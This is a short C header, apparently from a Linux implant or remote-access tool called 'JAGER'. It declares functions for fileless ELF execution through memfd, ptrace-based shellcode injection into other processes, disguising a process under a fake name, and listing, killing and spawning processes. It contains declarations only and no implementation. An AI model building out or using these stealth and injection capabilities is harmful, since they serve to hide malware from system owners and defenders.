#ifndef JAGER_LINUX_PROCESS_H
#define JAGER_LINUX_PROCESS_H

#include <stddef.h>
#include <sys/types.h>

extern char *g_original_argv0;
extern int g_original_argv0_len;

int memfd_exec(const unsigned char *elf_data, size_t elf_size, char *const argv[]);
int ptrace_inject(pid_t target_pid, const unsigned char *shellcode, size_t sc_size);
void masquerade_process(const char *fake_name);
void save_original_argv(int argc, char **argv);

int proc_ps(char *out, int max_out);
int proc_kill(int pid);
int proc_spawn(const char *cmd);

#endif
